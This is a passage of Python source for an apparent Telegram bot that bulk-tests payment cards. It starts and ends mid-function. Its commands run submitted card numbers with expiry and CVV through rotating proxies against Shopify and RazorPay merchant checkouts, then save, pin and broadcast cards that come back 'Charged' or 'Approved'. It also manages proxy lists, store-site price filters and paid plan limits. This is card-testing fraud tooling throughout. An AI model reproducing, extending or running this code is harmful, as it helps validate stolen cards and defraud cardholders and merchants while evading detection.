    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    uid = event.sender_id
    PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event}
    kb = [[pbtn(f"{bs('0-5 USD')}", f"siteprice:5:{uid}", bg_success=True, icon=CE["gem"]),
           pbtn(f"{bs('0-10 USD')}", f"siteprice:10:{uid}", bg_success=True, icon=CE["gem"])],
          [pbtn(f"{bs('0-20 USD')}", f"siteprice:20:{uid}", bg_success=True, icon=CE["gem"]),
           pbtn(f"{bs('0-40 USD')}", f"siteprice:40:{uid}", bg_success=True, icon=CE["gem"])]]
    await styled_reply(event, f"{PE} <b>{bs('Select Price Range')}</b> {PE}\n{PE} <b>{bs('Sites')}:</b> <code>{len(sites)}</code>\n{PE} <i>{bs('Dead + over-price will be removed')}</i>", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"]])

@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
async def site_price_cb(event):
    max_price = int(event.pattern_match.group(1).decode())
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = PENDING_SITE_CHECK.pop(uid, None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    await event.answer(f"{bs('Checking')}...")
    try: await event.delete()
    except: pass
    asyncio.create_task(_process_site_check(data["event"], data["sites"], max_price))

async def _process_site_check(event, sites, max_price):
    uid = event.sender_id
    total = len(sites); tested = alive_count = dead_count = kept_count = removed_price = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"{PE} <b>{bs('Checking')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    last_ui = [0]; dead_sites = set(); price_removed_sites = set()
    async def update_ui():
        now = time.time()
        if now - last_ui[0] < 3.0: return
        last_ui[0] = now
        try: await styled_edit(sm, f"{PE} <b>{tested}/{total}</b> | ✅{alive_count} ❌{dead_count}", emoji_ids=[CE["fire"]])
        except: pass
    async def check_worker(site):
        nonlocal tested, alive_count, dead_count, kept_count, removed_price
        async with user_site_sem:
            try:
                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
                tested += 1
                if res['status'] == 'alive':
                    alive_count += 1; pv = 0
                    ps = res.get('price', '-')
                    if ps and ps != '-':
                        try: pv = float(str(ps).replace('$', '').strip())
                        except: pass
                    if pv <= max_price: kept_count += 1
                    else: removed_price += 1; price_removed_sites.add(normalize_site_url(site))
                else: dead_count += 1; dead_sites.add(normalize_site_url(site))
                await update_ui()
            except asyncio.CancelledError: raise
            except: dead_count += 1; tested += 1; dead_sites.add(normalize_site_url(site))
    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(check_worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
    for s in sites:
        n = normalize_site_url(s)
        if n in dead_sites or n in price_removed_sites: await remove_site_db(uid, s)
    try: await styled_edit(sm, f"""{PE} <b>{bs('Done')}</b> | ✅{alive_count} ❌{dead_count} | {bs('Kept')}:{kept_count} | {bs('Removed')}:{dead_count + removed_price}""", emoji_ids=[CE["fire"]])
    except: pass
    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)

# ====================== PROXY ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    try:
        lines = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8") as f: lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
                finally:
                    try: os.remove(fp)
                    except: pass
            elif rm.text: lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2: lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else: return await styled_reply(event, f"{PE} <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        await ensure_user(event.sender_id)
        cc = await get_proxy_count(event.sender_id)
        if event.sender_id not in ADMIN_ID and cc >= 100:
            return await styled_reply(event, f"{PE} <b>{bs('Limit 100/100')}</b>", emoji_ids=[CE["cross"]])
        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in existing: parsed.append(pd); existing.add(pd['proxy_url'])
        if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:100-cc] if event.sender_id not in ADMIN_ID else parsed
        tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        added, failed = [], []
        for i in range(0, len(parsed), 10):
            batch = parsed[i:i+10]
            results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
            for pd2, res in zip(batch, results):
                if isinstance(res, tuple) and res[0]: await add_proxy_db(event.sender_id, pd2); added.append(1)
                else: failed.append(1)
        await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | {bs('Total')}: {cc+len(added)}/100", emoji_ids=[CE["fire"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
    text = f"{PE} <b>{bs('Proxies')}</b> ({len(proxies)}/100) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, p in enumerate(proxies[:30], 1): text += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"; eid.append(CE["link"])
    if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} more</i>"
    text += f"\n{PE} <code>/rmpxy index</code>"; eid.append(CE["trash"])
    await styled_reply(event, text, emoji_ids=eid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1: return await styled_reply(event, f"{PE} <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all':
        c = await clear_all_proxies(event.sender_id)
        return await styled_reply(event, f"{PE} <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, idx)
            await styled_reply(event, f"{PE} <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    except: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
    results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in proxies], return_exceptions=True)
    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"{PE} <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(results)-w}", emoji_ids=[CE["shield"]])

# ====================== FREE CHECK HELPER ======================
async def _check_free_limits(event, uid, plan, is_group):
    if uid in ADMIN_ID: return True
    if not is_paid_plan(plan):
        if not is_group: await send_group_only_message(event); return False
        used = get_free_sp_usage(uid)
        if used >= FREE_SP_DAILY_LIMIT:
            await styled_reply(event, f"{PE} <b>{bs('Daily Limit')}</b> {used}/{FREE_SP_DAILY_LIMIT}", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/PrimeTheOfficialNew")]], emoji_ids=[CE["stop"]])
            return False
        cd = get_free_sp_cooldown_remaining(uid)
        if cd > 0:
            await styled_reply(event, f"⚠️ <b>{bs('Wait')} {cd}{bs('s')}</b>", buttons=[[pbtn(bs("Upgrade"), url="https://t.me/PrimeTheOfficialNew")]])
            return False
    return True

def _get_card_from_event(event, reply_msg):
    card = None
    if reply_msg and reply_msg.text:
        cc = extract_cc(reply_msg.text)
        if cc: card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc: card = cc[0]
    return card

# ====================== /sp (Shopify Single) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check(event):
    parts = event.raw_text.split()
    if event.sender_id in ADMIN_ID and len(parts) == 3:
        try:
            target_uid = int(parts[1])
            limit = int(parts[2])
            if limit < 0 or limit > 999999:
                return await styled_reply(event, f"❌ <b>{bs('Limit must be between 0-999999')}</b>", emoji_ids=[CE["cross"]])
            await ensure_user(target_uid)
            if not await set_user_sp_limit(target_uid, limit):
                return await styled_reply(event, f"❌ <b>{bs('Failed to set limit')}</b>", emoji_ids=[CE["cross"]])
            await styled_reply(event, f"{PE} <b>{bs('Set custom SP limit to')} {limit} {bs('for')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
            try: await styled_send(target_uid, f"{PE} <b>{bs('Your SP check limit has been updated to')} {limit}</b>", emoji_ids=[CE["check"]])
            except: pass
            return
        except ValueError:
            pass

    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_gateway_disabled("shopify"):
        return await styled_reply(event, f"❌ <b>{bs('Gateway Disabled')}</b>\n⤷ <i>{bs('Shopify checking is currently offline.')}</i>", emoji_ids=[CE["stop"]])
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
    except: username, name = f"user_{uid}", "User"
    if is_paid_plan(plan) or uid in ADMIN_ID:
        sites = await get_user_sites(uid)
        if not sites:
            sites = await get_global_sites()
        proxies = await get_all_user_proxies(uid)
    else:
        sites, proxies = [], []
        for aid in ADMIN_ID:
            sites = await get_user_sites(aid)
            proxies = await get_all_user_proxies(aid)
            if sites: break
        if not sites:
            sites = await get_global_sites()
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No sites!')} </b><code>/add</code>", emoji_ids=[CE["warn"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    rotator = SmartRotator()
    try:
        http_session = await get_user_http_session(uid, "sp")
        async with get_user_sem(uid, "sp"):
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http_session)
            bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), result.get('Gateway', ''), result.get('Price', '')))
        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
        try: await lm.delete()
        except: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "Shopify"))
            asyncio.create_task(notify_charged_card(uid, name, card, result.get('Gateway', 'Shopify'), result.get('Response', ''), result.get('Price', '-')))
    except Exception as e:
        try: await lm.delete()
        except: pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ====================== /rz (RazorPay Single) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rz\b'))
async def rz_single_check(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_gateway_disabled("razorpay"):
        return await styled_reply(event, f"❌ <b>{bs('Gateway Disabled')}</b>\n⤷ <i>{bs('RazorPay checking is currently offline.')}</i>", emoji_ids=[CE["stop"]])
    sites = load_razorpay_sites()
    if not sites:
        return await styled_reply(event, f"❌ <b>{bs('No Razorpay Sites')}</b>\n⤷ <i>{bs('Please add razorpay sites using')} </i><code>/addrz</code>", emoji_ids=[CE["stop"]])
    _, at = await can_use(event.sender_id, event.chat)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if not await _check_free_limits(event, uid, plan, is_group): return
    try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
    except: username, name = f"user_{uid}", "User"
    proxies = await get_all_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, f"❌ <b>{bs('No Proxies Added')}</b>\n⤷ <i>{bs('Please add your own proxies first using')} </i><code>/addpxy</code>", emoji_ids=[CE["stop"]])
    rm = await event.get_reply_message() if event.reply_to_msg_id else None
    card = _get_card_from_event(event, rm)
    if not card: return await styled_reply(event, f"{PE} <code>/rz card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan): set_free_sp_last_use(uid); increment_free_sp_usage(uid)
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    st = time.time()
    try:
        http_session = await get_user_http_session(uid, "rz")
        bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
        result = await check_rz_with_retry(card, proxies, uid, max_retries=3, http_session=http_session)
        bi = await bin_task
        elapsed = round(time.time() - st, 2)
        status = result.get('Status', 'Declined')
        if status in ["Charged", "Approved"]:
            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), 'RazorPay', '-'))
        
        amt = await get_razorpay_amount()
        price_str = f"₹{amt / 100:.2f}"
        
        msg, eid = format_rz_single_result(status, card, 'RazorPay', result.get('Response', '')[:150], bi, elapsed, price_str)
        try: await lm.delete()
        except: pass
        rm2 = await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        if status == "Charged":
            asyncio.create_task(pin_charged_message(event, rm2))
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay"))
            asyncio.create_task(notify_charged_card(uid, name, card, 'RazorPay', result.get('Response', ''), '-'))
    except Exception as e:
        try: await lm.delete()
        except: pass
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ====================== /stop ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id
    stopped_any = False
    for store in [ACTIVE_MTXT_PROCESSES, ACTIVE_MRZ_PROCESSES]:
        proc = store.get(uid)
        if proc and isinstance(proc, dict):
            proc["stopped"] = True
            for task in proc.get("tasks", []):
                if not task.done(): task.cancel()
            stopped_any = True
    if not stopped_any: return await styled_reply(event, f"{PE} <b>{bs('No active session')}</b>", emoji_ids=[CE["warn"]])
    await styled_reply(event, f"{PE} <b>{bs('Stopping')}...</b>", emoji_ids=[CE["stop"]])

# ====================== GENERIC MASS PROCESSOR ======================
async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
    uid = event.sender_id
    try: sender = await event.get_sender(); username, name = sender.username or f"user_{uid}", sender.first_name or "User"
    except: username, name = f"user_{uid}", "User"
    total = len(cards); checked = charged = approved = declined = errors = 0
    chat_id = event.chat_id; is_group = chat_id != uid
    mode = bs("C+A") if send_approved else bs("C only")
    st = time.time(); hits = []
    
    mrz_speed = "original"
    if sem_type == "mrz":
        mrz_speed = await get_mrz_speed()
        workers = 10 if mrz_speed == "slow" else MRZ_PER_USER_WORKERS
        if mrz_speed == "slow":
            user_sem = asyncio.Semaphore(10)
        else:
            user_sem = get_user_sem(uid, sem_type)
    else:
        workers = MSP_PER_USER_WORKERS
        user_sem = get_user_sem(uid, sem_type)
        
    http_session = await get_user_http_session(uid, sem_type)
    is_rz = gate_name == "RazorPay"
    sm = await styled_reply(event, f"<pre>{PE} {bs('Processing')} ━ {mode} ━ {gate_name} ━ {workers}{bs('w')}</pre>", emoji_ids=[CE["chart"]])
    last_ui = [0]; lcd, lrd = "-", "-"
    
    # Ensure process store exists
    proc = process_store.get(uid)
    if proc is None:
        proc = {"stopped": False, "tasks": []}
        process_store[uid] = proc
    else:
        proc["stopped"] = False
        proc["tasks"] = []
    
    def is_stopped():
        proc_local = process_store.get(uid)
        if not proc_local: return True
        return proc_local.get("stopped", False) if isinstance(proc_local, dict) else False
        
    async def update_ui():
        nonlocal last_ui
        now = time.time()
        if now - last_ui[0] < 3.0 or is_stopped(): return
        last_ui[0] = now
        kb = [[pbtn(f"{lcd}", "none", bg_primary=True, icon=CE["search"])],
              [pbtn(f"{lrd}", "none", bg_primary=True, icon=CE["info"])],
              [pbtn(f"{bs('C')} ━ {charged}", "none", bg_success=True, icon=CE["fire"]),
               pbtn(f"{bs('A')} ━ {approved}", "none", bg_success=True, icon=CE["check"])],
              [pbtn(f"{bs('D')} ━ {declined}", "none", bg_danger=True, icon=CE["declined"]),
               pbtn(f"{bs('E')} ━ {errors}", "none", bg_danger=True, icon=CE["warn"])],
              [pbtn(f"{checked}/{total}", "none", bg_primary=True, icon=CE["chart"])],
              [pbtn(bs("Stop"), f"{stop_prefix}:{uid}", bg_danger=True, icon=CE["stop"])]]
        try: await styled_edit(sm, f"<pre>{PE} {bs('Processing')}...</pre>", buttons=kb, emoji_ids=[CE["star"]])
        except: pass
    error_cards = []
    charged_cards = []
    approved_cards = []
    declined_cards = []
    
    async def worker(card):
        nonlocal checked, charged, approved, declined, errors, lcd, lrd
        if is_stopped(): return
        async with user_sem:
            if is_stopped(): return
            if sem_type == "mrz" and mrz_speed == "slow":
                await asyncio.sleep(random.uniform(0.5, 1.5))
            try:
                result = await check_func(card, http_session)
                if is_stopped(): return
                status = result.get("Status", "Declined")
                resp = result.get("Response", ""); gw = result.get("Gateway", gate_name)
                checked += 1; lcd = card; lrd = resp[:30]
                
                bi = await get_bin_info_cached(card.split("|")[0])
                card_entry = {
                    "card": card,
                    "response": resp,
                    "gateway": gw,
                    "bin_info": bi
                }
                
                if status == "Error" or status == "RetryError":
                    errors += 1
                    error_cards.append(card_entry)
                elif status == "Charged":
                    charged += 1; hits.append(f"{card} - CHARGED - {resp} - {gw}")
                    charged_cards.append(card_entry)
                    asyncio.create_task(save_card_to_db(card, "CHARGED", resp, gw, result.get('Price', '-')))
                    asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                    asyncio.create_task(notify_charged_card(uid, name, card, gw, resp, result.get('Price', '-')))
                elif status == "Approved":
                    approved += 1; hits.append(f"{card} - APPROVED - {resp} - {gw}")
                    approved_cards.append(card_entry)
                    asyncio.create_task(save_card_to_db(card, "APPROVED", resp, gw, result.get('Price', '-')))
                    if send_approved:
                        asyncio.create_task(_send_mass_hit(card, result, status, uid, username, name, is_rz))
                else:
                    declined += 1
                    declined_cards.append(card_entry)
                await update_ui()
            except asyncio.CancelledError: return
            except:
                if not is_stopped():
                    errors += 1
                    checked += 1
                    error_cards.append({
                        "card": card,
                        "response": "Connection Crash",
                        "gateway": gate_name,
                        "bin_info": {"brand": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                    })
    batch_size = workers * 2; all_tasks = []
    proc = process_store.get(uid)
    for i in range(0, len(cards), batch_size):
        if is_stopped(): break
        batch_tasks = [asyncio.create_task(worker(c)) for c in cards[i:i+batch_size]]
        all_tasks.extend(batch_tasks)
        if isinstance(proc, dict): proc["tasks"] = all_tasks
        await asyncio.gather(*batch_tasks, return_exceptions=True)
    await asyncio.sleep(0.3)
    
    # Store error cards with timestamp to prevent overwrite
    raw_error_cards = [c["card"] for c in error_cards]
    if raw_error_cards:
        PENDING_RETRY_ERRORS[f"{uid}_{int(time.time())}"] = {
            "cards": raw_error_cards,
            "gate_name": gate_name,
            "send_approved": send_approved
        }
        
    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
    stop_label = f" ({bs('Stopped')})" if is_stopped() else ""
    ft = f"""{PE} <b>{bs('Complete')}{stop_label}</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Charged')}</b> ━ <code>{charged}</code>\n{PE} <b>{bs('Approved')}</b> ━ <code>{approved}</code>\n{PE} <b>{bs('Declined')}</b> ━ <code>{declined}</code>\n{PE} <b>{bs('Errors')}</b> ━ <code>{errors}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Checked')}</b> ━ <code>{checked}/{total}</code>"""
    
    fkb = [[pbtn(f"{bs('C')} ━ {charged}", "none", bg_success=True, icon=CE["fire"]),
            pbtn(f"{bs('A')} ━ {approved}", "none", bg_success=True, icon=CE["check"])],
           [pbtn(f"{bs('T')} ━ {checked}/{total}", "none", bg_primary=True, icon=CE["chart"]),
            pbtn(f"{h}{bs('h')}{m}{bs('m')}{s}{bs('s')}", "none", bg_primary=True, icon=CE["restart"])]]
            
    # Build retry key with timestamp
    if raw_error_cards:
        retry_key = f"{uid}_{int(time.time())}"
        fkb.append([pbtn(bs("Recheck Errors 🔄"), f"retry_errors:{retry_key}", bg_danger=True, icon=CE["restart"])])
        
    for _ in range(3):
        try: await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]]); break
        except: await asyncio.sleep(0.5)
    await send_split_final_files(uid, charged_cards, approved_cards, declined_cards, error_cards, gate_name, uid)
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid, sem_type); cleanup_user_sem(uid)

async def _send_mass_hit(card, result, status, uid, username, name, is_rz=False):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        gw = result.get('Gateway', 'RazorPay' if is_rz else 'Shopify')
        resp = result.get('Response', '')[:150]
        if is_rz:
            msg, eid = format_card_result_no_price(status, card, gw, resp, bi, result.get('Price', '₹10'))
        else:
            msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), result.get('site', '-'), bi, 0.0)
        try: await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
        except: pass
        if status == "Charged":
            asyncio.create_task(send_channel_hit(result, uid, username, name, "RazorPay" if is_rz else "Shopify"))
    except: pass

async def send_split_final_files(uid, charged_list, approved_list, declined_list, error_list, gate_name, target_chat=None):
    target = target_chat or uid
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    try:
        sender = await client_instance.get_entity(uid)
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except:
        username = f"user_{uid}"
        name = "User"
        
    plan = await get_user_plan(uid)
    user_tier = f"{name} ({plan} 🌚)" if plan else f"{name} (Free 🌚)"
    
    def format_file_card(entry, status_str, emoji):
        card = entry["card"]
        resp = entry["response"]
        gw = entry["gateway"] or gate_name
        bi = entry["bin_info"] or {"brand": "-", "bank": "-", "country": "-", "flag": "🏳️"}
        
        return f"""𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {status_str} {emoji}
𝗖𝗮𝗿𝗱 ➛ {card}
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ {gw}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ {resp}
𝗕𝗿𝗮𝗻𝗱 ➛ {str(bi.get('brand', '-')).upper()}
𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {str(bi.get('bank', '-')).upper()}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {bi.get('flag', '🏳️')} {str(bi.get('country', '-')).upper()}
𝗨𝘀𝗲𝗿 ➛ 🌷 {user_tier}
𝗗𝗲𝘃 ➛ ⏤͟ 𝗣𝗿𝗶𝗺𝗲𝗧𝗵𝗲𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

    import shutil
    temp_dir = os.path.join(os.getcwd(), f"split_res_{uid}_{ts}")
    os.makedirs(temp_dir, exist_ok=True)
    
    try:
        if charged_list:
            fn_chg = os.path.join(temp_dir, "1st charged.txt")
            try:
                async with aiofiles.open(fn_chg, 'w', encoding='utf-8') as f:
                    for c in charged_list:
                        formatted = format_file_card(c, "CHARGED", "🔥")
                        await f.write(formatted + "\n\n")
                await styled_send(target, f"🔥 <b>{bs('Charged Cards Result File')}</b>\n⤷ <code>{len(charged_list)}</code> cards charged successfully.", file=fn_chg)
            except: pass
            await asyncio.sleep(0.5)

        if declined_list:
            fn_dec = os.path.join(temp_dir, "2nd declined.txt")
            try:
                async with aiofiles.open(fn_dec, 'w', encoding='utf-8') as f:
                    for c in declined_list:
                        formatted = format_file_card(c, "DECLINED", "❌")
                        await f.write(formatted + "\n\n")
                await styled_send(target, f"❌ <b>{bs('Declined Cards Result File')}</b>\n⤷ <code>{len(declined_list)}</code> cards declined.", file=fn_dec)
            except: pass
            await asyncio.sleep(0.5)

        if error_list:
            fn_err = os.path.join(temp_dir, "3 error.txt")
            try:
                async with aiofiles.open(fn_err, 'w', encoding='utf-8') as f:
                    for c in error_list:
                        formatted = format_file_card(c, "ERROR", "⚠️")
                        await f.write(formatted + "\n\n")
                kb = [[pbtn(bs("Recheck Errors 🔄"), f"retry_errors:{uid}_{int(time.time())}", bg_danger=True, icon=CE["restart"])]]
                await styled_send(target, f"⚠️ <b>{bs('Errors Result File')}</b>\n⤷ <code>{len(error_list)}</code> cards failed with errors.", file=fn_err, buttons=kb)
            except: pass
            await asyncio.sleep(0.5)

        if approved_list:
            fn_app = os.path.join(temp_dir, "4th approved.txt")
            try:
                async with aiofiles.open(fn_app, 'w', encoding='utf-8') as f:
                    for c in approved_list:
                        formatted = format_file_card(c, "APPROVED", "✅")
                        await f.write(formatted + "\n\n")
                await styled_send(target, f"✅ <b>{bs('Approved Cards Result File')}</b>\n⤷ <code>{len(approved_list)}</code> cards approved (3D/OTP/Insuf).", file=fn_app)
            except: pass
            await asyncio.sleep(0.5)
            
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

# ====================== /msp (Shopify Mass) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if await is_gateway_disabled("shopify"):
        return await styled_reply(event, f"❌ <b>{bs('Gateway Disabled')}</b>\n⤷ <i>{bs('Shopify checking is currently offline.')}</i>", emoji_ids=[CE["stop"]])
    _, at, plan = await get_user_access(event)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = await get_user_sp_limit(plan, uid)
